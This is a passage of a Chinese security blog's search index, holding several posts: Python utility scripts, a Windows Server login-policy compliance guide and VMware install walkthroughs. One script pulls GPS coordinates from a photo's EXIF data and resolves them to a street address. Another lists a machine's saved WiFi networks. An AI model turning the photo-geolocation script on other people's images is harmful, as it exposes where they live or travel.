<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>脚本</title>
    <link href="/2023/06/01/%E8%84%9A%E6%9C%AC/"/>
    <url>/2023/06/01/%E8%84%9A%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h1 id="好用的python3脚本"><a href="#好用的python3脚本" class="headerlink" title="好用的python3脚本"></a>好用的python3脚本</h1><h2 id="识别Windows环境下的WIFI连接历史记录-不需要安装模块"><a href="#识别Windows环境下的WIFI连接历史记录-不需要安装模块" class="headerlink" title="识别Windows环境下的WIFI连接历史记录(不需要安装模块)"></a>识别Windows环境下的WIFI连接历史记录(不需要安装模块)</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> subprocess<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_previous_networks</span>():<br>    networks = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 执行 netsh 命令获取历史连接过的无线网络列表</span><br>        result = subprocess.run([<span class="hljs-string">&#x27;netsh&#x27;</span>, <span class="hljs-string">&#x27;wlan&#x27;</span>, <span class="hljs-string">&#x27;show&#x27;</span>, <span class="hljs-string">&#x27;profiles&#x27;</span>], capture_output=<span class="hljs-literal">True</span>, text=<span class="hljs-literal">True</span>)<br><br>        <span class="hljs-comment"># 解析输出，提取历史无线网络名称</span><br>        output_lines = result.stdout.splitlines()<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> output_lines:<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;所有用户配置文件&quot;</span> <span class="hljs-keyword">in</span> line:<br>                ssid = line.split(<span class="hljs-string">&quot;:&quot;</span>)[<span class="hljs-number">1</span>].strip()<br>                networks.append(ssid)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;获取历史无线网络失败:&quot;</span>, e)<br><br>    <span class="hljs-keyword">return</span> networks<br><br><span class="hljs-comment"># 输出历史连接过的无线网络</span><br>networks = get_previous_networks()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;历史上连接过的无线网络:&quot;</span>)<br><span class="hljs-keyword">for</span> network <span class="hljs-keyword">in</span> networks:<br>    <span class="hljs-built_in">print</span>(network)<br></code></pre></td></tr></table></figure><h2 id="图片定位，调用高德地图API（需原始图片，GPS信息未被抹除）"><a href="#图片定位，调用高德地图API（需原始图片，GPS信息未被抹除）" class="headerlink" title="图片定位，调用高德地图API（需原始图片，GPS信息未被抹除）"></a>图片定位，调用高德地图API（需原始图片，GPS信息未被抹除）</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> exifread<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_geolocation_from_image</span>(<span class="hljs-params">image_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(image_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> image_file:<br>        tags = exifread.process_file(image_file)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;GPS GPSLatitude&#x27;</span> <span class="hljs-keyword">in</span> tags <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;GPS GPSLongitude&#x27;</span> <span class="hljs-keyword">in</span> tags:<br>            latitude = tags[<span class="hljs-string">&#x27;GPS GPSLatitude&#x27;</span>]<br>            longitude = tags[<span class="hljs-string">&#x27;GPS GPSLongitude&#x27;</span>]<br><br>            lat_ref = <span class="hljs-built_in">str</span>(tags[<span class="hljs-string">&#x27;GPS GPSLatitudeRef&#x27;</span>])<br>            lng_ref = <span class="hljs-built_in">str</span>(tags[<span class="hljs-string">&#x27;GPS GPSLongitudeRef&#x27;</span>])<br><br>            lat_degrees = latitude.values[<span class="hljs-number">0</span>].num / latitude.values[<span class="hljs-number">0</span>].den<br>            lat_minutes = latitude.values[<span class="hljs-number">1</span>].num / latitude.values[<span class="hljs-number">1</span>].den<br>            lat_seconds = latitude.values[<span class="hljs-number">2</span>].num / latitude.values[<span class="hljs-number">2</span>].den<br><br>            lng_degrees = longitude.values[<span class="hljs-number">0</span>].num / longitude.values[<span class="hljs-number">0</span>].den<br>            lng_minutes = longitude.values[<span class="hljs-number">1</span>].num / longitude.values[<span class="hljs-number">1</span>].den<br>            lng_seconds = longitude.values[<span class="hljs-number">2</span>].num / longitude.values[<span class="hljs-number">2</span>].den<br><br>            <span class="hljs-comment"># 转换为度（Decimal Degrees）格式</span><br>            lat_decimal_degrees = lat_degrees + lat_minutes / <span class="hljs-number">60</span> + lat_seconds / <span class="hljs-number">3600</span><br>            lng_decimal_degrees = lng_degrees + lng_minutes / <span class="hljs-number">60</span> + lng_seconds / <span class="hljs-number">3600</span><br><br>            <span class="hljs-comment"># 转换为负值，如果经纬度方向是南或西</span><br>            <span class="hljs-keyword">if</span> lat_ref == <span class="hljs-string">&#x27;S&#x27;</span>:<br>                lat_decimal_degrees = -lat_decimal_degrees<br>            <span class="hljs-keyword">if</span> lng_ref == <span class="hljs-string">&#x27;W&#x27;</span>:<br>                lng_decimal_degrees = -lng_decimal_degrees<br><br>            <span class="hljs-keyword">return</span> lat_decimal_degrees, lng_decimal_degrees<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">geocode_analysis</span>(<span class="hljs-params">lat, lng, api_key</span>):<br>    url = <span class="hljs-string">f&#x27;https://restapi.amap.com/v3/geocode/regeo?location=<span class="hljs-subst">&#123;lng&#125;</span>,<span class="hljs-subst">&#123;lat&#125;</span>&amp;key=<span class="hljs-subst">&#123;api_key&#125;</span>&amp;output=json&#x27;</span><br>    response = requests.get(url)<br>    data = response.json()<br><br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&#x27;status&#x27;</span>] == <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> data[<span class="hljs-string">&#x27;info&#x27;</span>] == <span class="hljs-string">&#x27;OK&#x27;</span>:<br>        address = data[<span class="hljs-string">&#x27;regeocode&#x27;</span>][<span class="hljs-string">&#x27;formatted_address&#x27;</span>]<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;经度: <span class="hljs-subst">&#123;lng&#125;</span>, 纬度: <span class="hljs-subst">&#123;lat&#125;</span>&#x27;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;地址: <span class="hljs-subst">&#123;address&#125;</span>&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无法获取地址信息&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 在这里填入你的高德地图API密钥</span><br>    api_key = <span class="hljs-string">&#x27;高德api调用&#x27;</span><br><br>    <span class="hljs-comment"># 假设你有一个图片的路径</span><br>    image_path = <span class="hljs-string">&#x27;图片路径&#x27;</span><br><br>    geolocation = get_geolocation_from_image(image_path)<br>    <span class="hljs-keyword">if</span> geolocation:<br>        latitude, longitude = geolocation<br>        geocode_analysis(latitude, longitude, api_key)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;无法获取&#x27;</span>)<br><br></code></pre></td></tr></table></figure><h2 id="隐写：基础的PNG图片高度宽度恢复脚本"><a href="#隐写：基础的PNG图片高度宽度恢复脚本" class="headerlink" title="隐写：基础的PNG图片高度宽度恢复脚本"></a>隐写：基础的PNG图片高度宽度恢复脚本</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> struct<br><br><span class="hljs-comment"># 读取修改后的图片文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;高度宽度损坏图片路径&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    modified_data = file.read()<br><br>crcbp = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;F:\\.vscode\\class.py\\2.png&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()  <span class="hljs-comment"># 打开图片</span><br>crc32frombp = <span class="hljs-built_in">int</span>(crcbp[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>)  <span class="hljs-comment"># 读取图片中的CRC校验值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;crc:&#x27;</span>, crc32frombp)<br><br>found_solution = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">for</span> height <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># 宽度1-4000进行枚举</span><br>    <span class="hljs-keyword">for</span> width <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4000</span>):  <span class="hljs-comment"># 高度1-4000进行枚举</span><br>        data = crcbp[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + \<br>               struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, height) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, width) + crcbp[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>        crc32 = binascii.crc32(data) &amp; <span class="hljs-number">0xffffffff</span><br>        <span class="hljs-keyword">if</span> crc32 == crc32frombp:<br>            <span class="hljs-comment"># 计算修改后的图片数据的起始位置</span><br>            data_start = modified_data.find(<span class="hljs-string">b&#x27;\x49\x44\x41\x54&#x27;</span>)  <span class="hljs-comment"># IDAT 块的起始标识</span><br><br>            <span class="hljs-comment"># 读取修改后的图片数据</span><br>            modified_image_data = modified_data[data_start:]  <span class="hljs-comment"># 从起始位置之后的数据为修改后的图片数据</span><br><br>            <span class="hljs-comment"># 写入修改后的数据到新文件</span><br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;修复后的图片存放路径&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>                <span class="hljs-comment"># 重新构建 PNG 文件头</span><br>                file.write(crcbp[:<span class="hljs-number">16</span>])<br>                file.write(struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, height))<br>                file.write(struct.pack(<span class="hljs-string">&#x27;!I&#x27;</span>, width))<br>                file.write(crcbp[<span class="hljs-number">24</span>:data_start])<br>                file.write(modified_image_data)<br><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;图片还原完成！原始图片的高度为:&quot;</span>, height, <span class="hljs-string">&quot;宽度为:&quot;</span>, width)<br>            found_solution = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 结束内层循环</span><br>    <span class="hljs-keyword">if</span> found_solution:<br>        <span class="hljs-keyword">break</span>  <span class="hljs-comment"># 结束外层循环</span><br><br></code></pre></td></tr></table></figure><h2 id="提前json文件中的question属性"><a href="#提前json文件中的question属性" class="headerlink" title="提前json文件中的question属性"></a>提前json文件中的question属性</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">extract_questions_from_json</span>(<span class="hljs-params">json_file_path</span>):<br>    <span class="hljs-comment"># 读取JSON文件</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_file_path, <span class="hljs-string">&#x27;r&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        data = json.load(file) <br>    <span class="hljs-comment"># 从数据中提取question字段</span><br>    questions = [entry[<span class="hljs-string">&quot;question&quot;</span>] <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> data] <br>    <span class="hljs-keyword">return</span> questions<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">save_to_excel</span>(<span class="hljs-params">questions</span>):<br>    <span class="hljs-comment"># 创建一个pandas DataFrame</span><br>    df = pd.DataFrame(questions, columns=[<span class="hljs-string">&quot;Question&quot;</span>])<br>    <span class="hljs-comment"># 保存DataFrame为Excel文件</span><br>    df.to_excel(<span class="hljs-string">&quot;Excel文件名&quot;</span>, index=<span class="hljs-literal">False</span>, engine=<span class="hljs-string">&#x27;openpyxl&#x27;</span>)<br><br><span class="hljs-comment"># 使用函数</span><br>questions = extract_questions_from_json(<span class="hljs-string">&quot;&quot;</span>)  <span class="hljs-comment"># 请替换为您的JSON文件路径</span><br>save_to_excel(questions)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;已保存为questions.xlsx&quot;</span>)<br><br></code></pre></td></tr></table></figure><blockquote><p>** 本项目基于开源，用于讨论和技术探讨，如果使用者用其做任何违法或者不正当行为，均尤其使用者自己承担。**</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshow</title>
    <link href="/2023/03/01/ctfshow/"/>
    <url>/2023/03/01/ctfshow/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>身份鉴别</title>
    <link href="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/"/>
    <url>/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/</url>
    
    <content type="html"><![CDATA[<p>身份鉴别</p><h1 id="Windows-身份鉴别"><a href="#Windows-身份鉴别" class="headerlink" title="Windows 身份鉴别"></a>Windows 身份鉴别</h1><blockquote><p>适用范围 : Windows Server 2022 、Windows Server 2019、Windows Server 2016</p><p>本次实验为 Windows Server 2019</p></blockquote><h2 id="一、说明"><a href="#一、说明" class="headerlink" title="一、说明"></a>一、说明</h2><p>本篇文章主要是记录说明一下Windows系统中的身份鉴别控制点中的相关内容和理解</p><h2 id="二、内容"><a href="#二、内容" class="headerlink" title="二、内容"></a>二、内容</h2><ol><li>应对登录的用户进行身份标识和鉴别，身份标识具有唯一性，身份鉴别信息具有复杂要求并定期更换；</li><li>应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当前登录连接超时自动退出等相关措施</li><li>当进行远程管理时，应采取必要措施防止鉴别信息在网络传输过程中被窃听</li><li>应采用口令、密码技术、生物技术等两种或两种以上的组合的鉴别技术对用户进行身份鉴别，且其中一种鉴别技术至少应使用密码技术来实现</li></ol><h2 id="三、登录"><a href="#三、登录" class="headerlink" title="三、登录"></a>三、登录</h2><ol><li>1 应对登录的用户进行身份标识和鉴别</li></ol><p>身份标识功能（用户名）属于Windows自带功能。而对用户进行鉴别也就是登录时需要你输入用户名、口令的行为、不是强制开启的，可以在某种程度上取消掉。</p><p>针对本地登录，使用<strong>win+R</strong> 组合键打开运行框，在里面内输入<code>netplwiz</code>,则会出现用户账户界面，如下图所示：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF1.png" class="" title="图片展示"><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF2.png" class="" title="图片展示"><p>当我们在本机用户列表中，选择其中某一个用户，比如Administrator后，再去掉“要使用本计算机，用户必须输入用户名和密码”选项后。则表示，下次开机登录时，将会跳过对用户进行鉴别的过程，直接以这个Administrator身份登入电脑。</p><p>但有一点，并不是所以情况下对用户进行鉴别都被跳过了，如切换账号、睡眠、锁定、注销这几种情况后重新登录，还是需要输入用户口令。所以这里的选项仅仅只能跳过<strong>开机</strong>对 用户的身份鉴别过程。</p><p>另外，若如果某用户是空口令，那么自然也就没用了。</p><p>针对“远程登录” ，则一般是要看对方是否勾选了“记住密码”此类的选项了。</p><ol><li>2 身份标识具有唯一性</li></ol><p>即用户名或用户ID不能重复，Windows自动实现，默认符合。</p><ol><li>3身份鉴别信息具有复杂度要求</li></ol><p>这个要从两个方面看，我个人觉得两个方面都符合才能算达到要求。</p><p>第一个方面即实际的口令是否具一定的复杂度，且包含大写字母、小写字母、数字、特殊字符这四类字符种的三种，且口令不包含简单排列规律，如admin!@#123此类弱口令。</p><p>第二个方面即windows是否进行了口令复杂度策略的设置，强制要求口令具有一定的复杂度，也即在windows的密码策略中进行了设置，如下：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF3.png" class="" title="图片展示"><p>这些都是可以自己设置的！</p><p>我们主要关心的是“密码必须符合复杂性要求”、“密码长度最小值”、“强制密码历史”这三个选项。</p><p>“密码必须符合复杂性要求”，其具体内容如下：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF4.png" class="" title="图片展示"><p>从上图可以看出，启用了这个选项，口令就快要达到要求了（口令长度要求未达标）。</p><p>至于“密码长度最小值”，就不用多说了，设置为8或者8以上即可符合口令长度要求。</p><p>而“强制密码历史”这个选项，其数值代表windows会记忆n（0&lt;n&lt;24）个旧口令，而每当用户修改口令时，不能与以前的n个旧口令重复，这个选项我个人不管它，设置了很好，不设置我觉得也符合要求。（这个很多人不喜欢，把它设置为0就可以了，如下图）</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF5.png" class="" title="图片展示"><ol><li>4 要求并定期更换</li></ol><p>和口令复杂度一样，一个方面是看实际的口令更换周期。</p><p>对于口令更换周期，在cmd中使用如下命令即可得知上一次口令更换时间 输入<code>net user administrator</code>（用户名）：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF6.png" class="" title="图片展示"><p>也就是上图中“上次设置密码”的值，一般90天内有更换即可。</p><p>另一方面就是查看windows的密码策略：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF3.png" class="" title="图片展示"><p>即上图的“密码最长使用期限”，一般设置值小于等于90天即可。</p><p>至于“密码最短使用期限”，指的是多少天内不能更改密码</p><p>不过对于口令更换策略而言，还有个地方需要先去看看，也就是在计算机管理-本地用户和组-用户中：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF7.png" class="" title="图片展示"><p>右键用户，在菜单中点击属性：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF8.png" class="" title="图片展示"><p>可以设置一些关于账户的东西。</p><p>如果“密码到期”为“永不”，要么就是windows的密码策略中的“密码最长使用期限”为0，要么就是在这个用户的属性中勾选了“密码永不过期”，总而言之，就是不符合要求。</p><p>如果设置了“密码最长使用期限”，且该用户未勾选“密码永不过期”，则“密码到期”就是一个具体的日期，也就是“上次设置密码”的值加上“密码最长使用期限”的值，得出来的一个时间。</p><h2 id="四、应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"><a href="#四、应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施" class="headerlink" title="四、应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施"></a>四、应具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数和当登录连接超时自动退出等相关措施</h2><ol start="2"><li>1应当具有登录失败处理功能，应配置并启用结束会话、限制非法登录次数等相关措施</li></ol><p>这个比较好理解，即连续登录达到N次的时候，将登录账户锁定，在Windows的<strong>账户锁定策略</strong>中进行设置（本地安全策略–账户策略–账户锁定策略）；</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF9.png" class="" title="图片展示"><blockquote><p>一般账户锁定阈值设置小于等于5，锁定时间和重置时间大于等于30分钟即可符合要求。</p></blockquote><p><strong>注意</strong>：这个地方只针对本地登录或者使用远程桌面进行登录的情况，如果对方使用第三方软件进行远程登录，那就要那个软件上查看相关配置。</p><ol start="2"><li>2 当登录连接超时自动退出</li></ol><p>一般设置时间限制小于等于30分钟即可。</p><ol start="2"><li>2.1 本地登录</li></ol><p>对于本地登录，可以通过查看<strong>屏幕保护程序</strong>：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF10.png" class="" title="图片展示"><p>如果这里选择了<strong>在恢复时显示登录屏幕</strong>，再设置<strong>等待</strong>时间，即可实现超过时间限制自动退出的功能。</p><blockquote><p><strong>注意</strong>：这里选不选择<strong>屏幕保护程序</strong>都不影响自动退出功能，<strong>屏幕保护程序</strong>设置为无的话，也只是锁定后显示屏上不会运行相关的动画而已</p></blockquote><p>也可以查看<strong>更改电源设置</strong>，比如：</p><img src="/2023/02/23/%E8%BA%AB%E4%BB%BD%E9%89%B4%E5%88%AB/%E4%BF%A1%E6%81%AF11.png" class="" title="图片展示"><p>也就是设置待机多少时间后进入睡眠模式，进入后激活是需要输入用户名、口令的。</p><p>不过应该没有人会在服务器上面设置这东西吧？（进入睡眠模式后，进程都会停止运行的）所以，本地的话一般查看<strong>屏幕保护程序</strong>就可以了。</p><blockquote><p>注意：如果在<strong>屏幕保护程序</strong>设置了超时，那么对于远程登录而言，应该也会具备效果的。</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>信息安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在VMware中安装Windows Server 2003详细图文安装过程（补充）</title>
    <link href="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/"/>
    <url>/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/</url>
    
    <content type="html"><![CDATA[<p>Windows Server 2003</p><h1 id="在VMware中安装Windows-Server-2003详细图文安装过程（补充）"><a href="#在VMware中安装Windows-Server-2003详细图文安装过程（补充）" class="headerlink" title="在VMware中安装Windows Server 2003详细图文安装过程（补充）"></a>在VMware中安装Windows Server 2003详细图文安装过程（补充）</h1><p>在之前的安装结束之后，发现了一个问题，如下图所示：这个不知道怎么解决（找不到CD2的位置）</p><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%851.png" class="" title="图片展示"><blockquote><p>查阅了许多资料之后，终于找到了解决方法，解决方法如下：</p></blockquote><ol><li>下载：<a href="https://msdn.itellyou.cn/">server 2003 R2 disc2</a></li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%850.png" class="" title="图片展示"><ol start="2"><li>打开上方菜单栏“虚拟机》》设置”，插入server 2003 R2 disc2，一会儿就会出现安装界面</li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%852.png" class="" title="图片展示"><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%853.png" class="" title="图片展示"><ol start="3"><li>安装Windows Server 2003 R2、</li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%854.png" class="" title="图片展示"><ol start="4"><li>下一步，接受条款，继续下一步</li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%855.png" class="" title="图片展示"><ol start="5"><li>安装完成后，点击完成，并重启</li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%856.png" class="" title="图片展示"><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%857.png" class="" title="图片展示"><ol start="6"><li>再次开机，你将看到开机界面server 2003 R2后多了R2，这说明，你已经安装成功了哦！<br><strong>对比上下两图的区别</strong><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%858.png" class="" title="图片展示"></li></ol><img src="/2023/02/22/windows-server-2003-%E8%A1%A5%E5%85%85/%E8%A1%A5%E5%85%859.png" class="" title="图片展示"><blockquote><p>补充就到这里结束了，可以正常使用了！</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>操作系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>原创：lingdu</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>在VMware中安装Windows Server 2003详细图文安装过程</title>
    <link href="/2023/02/22/windows-server-2003/"/>
    <url>/2023/02/22/windows-server-2003/</url>
    
    <content type="html"><![CDATA[<p>Windows Server 2003</p><h1 id="在VMware中安装Windows-Server-2003详细图文安装过程"><a href="#在VMware中安装Windows-Server-2003详细图文安装过程" class="headerlink" title="在VMware中安装Windows Server 2003详细图文安装过程"></a>在VMware中安装Windows Server 2003详细图文安装过程</h1><h2 id="一、首先需要下载ios镜像，下面给出镜像地址，最好下载企业版"><a href="#一、首先需要下载ios镜像，下面给出镜像地址，最好下载企业版" class="headerlink" title="一、首先需要下载ios镜像，下面给出镜像地址，最好下载企业版"></a>一、首先需要下载ios镜像，下面给出镜像地址，最好下载企业版</h2><p>下载地址: <a href="https://www.2cto.com/soft/201607/65695.html">windows server 2003</a></p><h2 id="二、VMware安装步骤"><a href="#二、VMware安装步骤" class="headerlink" title="二、VMware安装步骤"></a>二、VMware安装步骤</h2><p>打开VMware，点击我的主页，选择新建虚拟机</p><img src="/2023/02/22/windows-server-2003/%E9%A6%96%E9%A1%B5.png" class="" title="图片展示"><p>选择<strong>典型</strong>这一个，然后点击下一步</p><img src="/2023/02/22/windows-server-2003/%E5%90%91%E5%AF%BC.png" class="" title="图片展示"><p>这里选择<strong>稍后安装</strong>，然后点击下一步</p><img 